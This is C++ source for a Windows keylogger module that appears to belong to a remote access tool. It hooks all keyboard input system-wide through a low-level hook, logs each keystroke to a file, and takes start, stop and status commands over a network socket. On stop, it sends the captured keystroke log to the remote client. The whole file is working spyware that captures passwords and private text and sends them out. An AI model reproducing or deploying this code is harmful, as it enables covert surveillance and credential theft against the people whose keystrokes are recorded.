#include "Keylogger.hpp"

#include <format>
#include <fstream>
#include "File.hpp"
#include "Response.hpp"

std::atomic_bool Keylogger::isKeyloggerRunning(false);
FILE *Keylogger::keylogFile = nullptr;
HHOOK Keylogger::hKeyboardHook = nullptr;
HINSTANCE Keylogger::hKeyboardInstance = nullptr;
HANDLE Keylogger::hThread = nullptr;
DWORD Keylogger::dwThreadID = 0;
std::atomic_bool Keylogger::isShiftPressed = false;
std::atomic_bool Keylogger::isCapsLockOn = false;

DWORD WINAPI Keylogger::SKeylogger(LPVOID *) {
    if (isKeyloggerRunning) {
        return 1;
    }
    hKeyboardInstance = GetModuleHandle(nullptr);
    if (!hKeyboardInstance) {
        return 1;
    }
    isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
    isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hKeyboardInstance, 0);
    if (!hKeyboardHook) {
        hKeyboardInstance = nullptr;
        hKeyboardHook = nullptr;
        return 1;
    }
    isKeyloggerRunning = true;
    keylogFile = fopen(KEYLOG_FILENAME.c_str(), "w");
    if (!keylogFile) {
        isKeyloggerRunning = false;
        delete keylogFile;
        keylogFile = nullptr;
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = nullptr;
        hKeyboardInstance = nullptr;
        return 1;
    }
    MSG msg = {};
    while (isKeyloggerRunning && GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (isKeyloggerRunning)
        StopKeylogger();
    return 0;
}

void Keylogger::StopKeylogger() {
    if (!isKeyloggerRunning) {
        std::cerr << "Keylogger is not running." << std::endl;
        return;
    }
    isKeyloggerRunning = false;

    if (hKeyboardHook) {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = nullptr;
    }
    else {
        std::cerr << "Keylogger hook is already closed." << std::endl;
    }
    if (hKeyboardInstance) {
        hKeyboardInstance = nullptr;
    }
    else {
        std::cerr << "Keylogger instance is already closed." << std::endl;
    }
}

LRESULT Keylogger::LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (!isKeyloggerRunning || !keylogFile) {
        return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
    }
    auto *pKeyBoard = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
    if (code != HC_ACTION) {
        return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
    }
    switch (wParam) {
        case WM_SYSKEYDOWN:
        case WM_KEYDOWN: {
            switch (DWORD vkCode = pKeyBoard->vkCode) {
                case VK_BACK:
                    fputs("[BACKSPACE]",keylogFile);
                    break;
                case VK_TAB:
                    fputs("[TAB]",keylogFile);
                    break;
                case VK_RETURN:
                    fputs("[ENTER]\n",keylogFile);
                    break;
                case VK_SHIFT:
                    fputs("[SHIFT]",keylogFile);
                    isShiftPressed = true;
                    break;
                case VK_CONTROL:
                    fputs("[CONTROL]",keylogFile);
                    break;
                case VK_MENU:
                    fputs("[ALT]",keylogFile);
                    break;
                case VK_CAPITAL:
                    fputs("[CAPS LOCK]",keylogFile);
                    isCapsLockOn = !isCapsLockOn;
                    break;
                case VK_ESCAPE:
                    fputs("[ESCAPE]",keylogFile);
                    break;
                case VK_SPACE:
                    fputs(" ",keylogFile);
                    break;
                case VK_PRIOR:
                    fputs("[PAGE UP]",keylogFile);
                    break;
                case VK_NEXT:
                    fputs("[PAGE DOWN]",keylogFile);
                    break;
                case VK_END:
                    fputs("[END]",keylogFile);
                    break;
                case VK_HOME:
                    fputs("[HOME]",keylogFile);
                    break;
                case VK_LEFT:
                    fputs("[LEFT ARROW]",keylogFile);
                    break;
                case VK_RIGHT:
                    fputs("[RIGHT ARROW]",keylogFile);
                    break;
                case VK_UP:
                    fputs("[UP ARROW]",keylogFile);
                    break;
                case VK_DOWN:
                    fputs("[DOWN ARROW]",keylogFile);
                    break;
                case VK_SELECT:
                    fputs("[SELECT]",keylogFile);
                    break;
                case VK_PRINT:
                    fputs("[PRINT SCREEN]",keylogFile);
                    break;
                case VK_EXECUTE:
                    fputs("[EXECUTE]",keylogFile);
                    break;
                case VK_SNAPSHOT:
                    fputs("[SNAPSHOT]",keylogFile);
                    break;
                case VK_INSERT:
                    fputs("[INSERT]",keylogFile);
                    break;
                case VK_DELETE:
                    fputs("[DELETE]",keylogFile);
                    break;
                case VK_HELP:
                    fputs("[HELP]",keylogFile);
                    break;
                case VK_LWIN:
                case VK_RWIN:
                    fputs("[WINDOWS]",keylogFile);
                    break;
                case VK_APPS:
                    fputs("[APPLICATION]",keylogFile);
                    break;
                case VK_SLEEP:
                    fputs("[SLEEP]",keylogFile);
                    break;
                case VK_NUMPAD0:
                    fputs("[NUMPAD 0]",keylogFile);
                    break;
                case VK_NUMPAD1:
                    fputs("[NUMPAD 1]",keylogFile);
                    break;
                case VK_NUMPAD2:
                    fputs("[NUMPAD 2]",keylogFile);
                    break;
                case VK_NUMPAD3:
                    fputs("[NUMPAD 3]",keylogFile);
                    break;
                case VK_NUMPAD4:
                    fputs("[NUMPAD 4]",keylogFile);
                    break;
                case VK_NUMPAD5:
                    fputs("[NUMPAD 5]",keylogFile);
                    break;
                case VK_NUMPAD6:
                    fputs("[NUMPAD 6]",keylogFile);
                    break;
                case VK_NUMPAD7:
                    fputs("[NUMPAD 7]",keylogFile);
                    break;
                case VK_NUMPAD8:
                    fputs("[NUMPAD 8]",keylogFile);
                    break;
                case VK_NUMPAD9:
                    fputs("[NUMPAD 9]",keylogFile);
                    break;
                case VK_MULTIPLY:
                    fputs("[NUMPAD *]",keylogFile);
                    break;
                case VK_ADD:
                    fputs("[NUMPAD +]",keylogFile);
                    break;
                case VK_SEPARATOR:
                    fputs("[NUMPAD SEPARATOR]",keylogFile);
                    break;
                case VK_SUBTRACT:
                    fputs("[NUMPAD -]",keylogFile);
                    break;
                case VK_DECIMAL:
                    fputs("[NUMPAD .]",keylogFile);
                    break;
                case VK_DIVIDE:
                    fputs("[NUMPAD /]",keylogFile);
                    break;
                case VK_F1:
                    fputs("[F1]",keylogFile);
                    break;
                case VK_F2:
                    fputs("[F2]",keylogFile);
                    break;
                case VK_F3:
                    fputs("[F3]",keylogFile);
                    break;
                case VK_F4:
                    fputs("[F4]",keylogFile);
                    break;
                case VK_F5:
                    fputs("[F5]",keylogFile);
                    break;
                case VK_F6:
                    fputs("[F6]",keylogFile);
                    break;
                case VK_F7:
                    fputs("[F7]",keylogFile);
                    break;
                case VK_F8:
                    fputs("[F8]",keylogFile);
                    break;
                case VK_F9:
                    fputs("[F9]",keylogFile);
                    break;
                case VK_F10:
                    fputs("[F10]",keylogFile);
                    break;
                case VK_F11:
                    fputs("[F11]",keylogFile);
                    break;
                case VK_F12:
                    fputs("[F12]",keylogFile);
                    break;
                case VK_F13:
                    fputs("[F13]",keylogFile);
                    break;
                case VK_F14:
                    fputs("[F14]",keylogFile);
                    break;
                case VK_F15:
                    fputs("[F15]",keylogFile);
                    break;
                case VK_F16:
                    fputs("[F16]",keylogFile);
                    break;
                case VK_F17:
                    fputs("[F17]",keylogFile);
                    break;
                case VK_F18:
                    fputs("[F18]",keylogFile);
                    break;
                case VK_F19:
                    fputs("[F19]",keylogFile);
                    break;
                case VK_F20:
                    fputs("[F20]",keylogFile);
                    break;
                case VK_F21:
                    fputs("[F21]",keylogFile);
                    break;
                case VK_F22:
                    fputs("[F22]",keylogFile);
                    break;
                case VK_F23:
                    fputs("[F23]",keylogFile);
                    break;
                case VK_F24:
                    fputs("[F24]",keylogFile);
                    break;
                case VK_NUMLOCK:
                    fputs("[NUM LOCK]",keylogFile);
                    break;
                case VK_SCROLL:
                    fputs("[SCROLL LOCK]",keylogFile);
                    break;
                case VK_LSHIFT:
                case VK_RSHIFT:
                    fputs("[SHIFT]",keylogFile);
                    isShiftPressed = true;
                    break;
                case VK_LCONTROL:
                case VK_RCONTROL:
                    fputs("[CONTROL]",keylogFile);
                    break;
                case VK_LMENU:
                case VK_RMENU:
                    fputs("[ALT]",keylogFile);
                    break;
                case VK_BROWSER_BACK:
                    fputs("[BROWSER BACK]",keylogFile);
                    break;
                case VK_BROWSER_FORWARD:
                    fputs("[BROWSER FORWARD]",keylogFile);
                    break;
                case VK_BROWSER_REFRESH:
                    fputs("[BROWSER REFRESH]",keylogFile);
                    break;
                case VK_BROWSER_STOP:
                    fputs("[BROWSER STOP]",keylogFile);
                    break;
                case VK_BROWSER_SEARCH:
                    fputs("[BROWSER SEARCH]",keylogFile);
                    break;
                case VK_BROWSER_FAVORITES:
                    fputs("[BROWSER FAVORITES]",keylogFile);
                    break;
                case VK_BROWSER_HOME:
                    fputs("[BROWSER HOME]",keylogFile);
                    break;
                case VK_VOLUME_MUTE:
                    fputs("[VOLUME MUTE]",keylogFile);
                    break;
                case VK_VOLUME_DOWN:
                    fputs("[VOLUME DOWN]",keylogFile);
                    break;
                case VK_VOLUME_UP:
                    fputs("[VOLUME UP]",keylogFile);
                    break;
                case VK_MEDIA_NEXT_TRACK:
                    fputs("[MEDIA NEXT TRACK]",keylogFile);
                    break;
                case VK_MEDIA_PREV_TRACK:
                    fputs("[MEDIA PREVIOUS TRACK]",keylogFile);
                    break;
                case VK_MEDIA_STOP:
                    fputs("[MEDIA STOP]",keylogFile);
                    break;
                case VK_MEDIA_PLAY_PAUSE:
                    fputs("[MEDIA PLAY/PAUSE]",keylogFile);
                    break;
                case VK_LAUNCH_MAIL:
                    fputs("[LAUNCH MAIL]",keylogFile);
                    break;
                case VK_LAUNCH_MEDIA_SELECT:
                    fputs("[LAUNCH MEDIA SELECT]",keylogFile);
                    break;
                case VK_LAUNCH_APP1:
                    fputs("[LAUNCH APP1]",keylogFile);
                    break;
                case VK_LAUNCH_APP2:
                    fputs("[LAUNCH APP2]",keylogFile);
                    break;
                default: {
                    if (vkCode <= VK_XBUTTON2)
                        break;
                    UINT key = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
                    if (key == 0) {
                        fputs(std::format("[Unknown key: {}]", vkCode).c_str(),keylogFile);
                    } else {
                        if (!(isShiftPressed ^ isCapsLockOn)) {
                            key = tolower(key);
                        }
                        if (isShiftPressed) {
                            switch (key) {
                                case '1': key = '!'; break;
                                case '2': key = '@'; break;
                                case '3': key = '#'; break;
                                case '4': key = '$'; break;
                                case '5': key = '%'; break;
                                case '6': key = '^'; break;
                                case '7': key = '&'; break;
                                case '8': key = '*'; break;
                                case '9': key = '('; break;
                                case '0': key = ')'; break;
                                case '-': key = '_'; break;
                                case '=': key = '+'; break;
                                case '[': key = '{'; break;
                                case ']': key = '}'; break;
                                case '\\': key = '|'; break;
                                case ';': key = ':'; break;
                                case '\'': key = '"'; break;
                                case ',': key = '<'; break;
                                case '.': key = '>'; break;
                                case '/': key = '?'; break;
                                case '`': key = '~'; break;
                                default: break;
                            }
                        }
                        fputc(key,keylogFile);
                    }
                }
            }
            break;
        }
        case WM_SYSKEYUP:
        case WM_KEYUP: {
            switch (pKeyBoard->vkCode) {
                case VK_LSHIFT:
                case VK_RSHIFT:
                case VK_SHIFT:
                    // fputs("[SHIFT RELEASED]",keylogFile);
                    isShiftPressed = false;
                    break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                    // fputs("[CONTROL RELEASED]",keylogFile);
                    break;
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                    // fputs("[ALT RELEASED]",keylogFile);
                    break;
                case VK_CAPITAL:
                    // fputs("[CAPS LOCK TOGGLED]",keylogFile);
                    break;
                default: break;
            }
            break;
        }
        default:
            break;
    }
    fflush(keylogFile);
    return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
}

void Keylogger::HandleRequest(SOCKET client_socket, const PacketHeader &header) {
    if (header.request_key != REQUEST_KEY) {
        Response response(header.request_id, 0xff);
        response.sendResponse(client_socket);
        return;
    }
    switch (header.request_type) {
        case 0x01: {
            if (isKeyloggerRunning) {
                Response response(header.request_id, 0x01); // Already running
                response.sendResponse(client_socket);
            } else {
                hThread = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SKeylogger), nullptr, 0, &dwThreadID);
                if (hThread) {
                    Response response(header.request_id, 0x00); // Started successfully
                    response.sendResponse(client_socket);
                } else {
                    Response response(header.request_id, 0x02); // Failed to start
                    response.sendResponse(client_socket);
                }
            }
            break;
        }
        case 0x02: {
            if (!isKeyloggerRunning) {
                Response response(header.request_id, 0x03); // Not running
                response.sendResponse(client_socket);
            } else {
                StopKeylogger();
                Response response(header.request_id, 0x00); // Stopped successfully
                File::SendFile(KEYLOG_FILENAME.c_str(), client_socket, header);
                response.sendResponse(client_socket);
            }
            break;
        }
        case 0x03: {
            Response response(header.request_id, isKeyloggerRunning ? 0x00 : 0x04);
            response.sendResponse(client_socket);
            break;
        }
        default: {
            Response response(header.request_id, 0x05);
            response.sendResponse(client_socket);
            break;
        }
    }
    closesocket(client_socket);
}
